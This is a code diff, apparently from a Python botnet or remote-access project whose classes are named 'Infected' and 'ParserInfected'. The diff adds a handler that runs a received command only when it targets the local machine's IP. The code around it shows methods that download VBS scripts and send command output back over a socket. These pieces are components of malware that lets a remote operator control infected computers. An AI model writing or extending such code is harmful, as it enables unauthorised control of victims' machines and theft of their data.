@@ -11,6 +11,13 @@ class ParserInfected:
         dataAux = data.split(" @ ")
         return getattr(self, dataAux[0])(dataAux)
         
+    def specificCommandIp(self, listOfParameters):
+        ip = listOfParameters[2]
+        command = listOfParameters[1]
+        isFinish = listOfParameters[3]
+        myIP = socket.gethostbyname(socket.gethostname())
+        if(ip == myIP):
+            return self.nativeCommand(["esto es al pedo no estoy seguro",command,isFinish])
     
     def downloadVBS(self, listOfParameters):
         #Descargar
@@ -71,7 +78,7 @@ class Infected:
         infile = open(path, 'r')
         text = ""
         for line in infile:
-            text += line   #no falta el espacio entre string?
+            text += line   
         infile.close()  
         return text        
     
@@ -83,7 +90,7 @@ class Infected:
         
         try:
             # Receive action
-            sock.sendall(bytes(output,"utf-8"))     #no hay una forma de enviarlo , pero no como bytes?           
+            sock.sendall(bytes(output,"utf-8"))                
         finally:
             sock.close()  
                 
